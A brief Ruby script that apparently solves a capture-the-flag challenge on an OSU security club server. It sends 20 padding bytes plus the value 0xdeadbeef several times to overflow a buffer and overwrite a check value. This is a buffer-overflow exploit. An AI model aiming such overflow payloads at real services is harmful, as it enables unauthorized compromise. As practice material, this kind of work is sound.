require 'socket'

a = TCPSocket.new('ctf.osusec.org', 10000)
puts "> " + a.recv(1024)
a.write "A"*20 + "\xef\xbe\xad\xde" + "\n"
a.write "A"*20 + "\xef\xbe\xad\xde" + "\n"
a.write "A"*20 + "\xef\xbe\xad\xde" + "\n"
a.write "A"*20 + "\xef\xbe\xad\xde" + "\n"
a.write "A"*20 + "\xef\xbe\xad\xde" + "\n"
puts "> " + a.recv(1024)
a.close
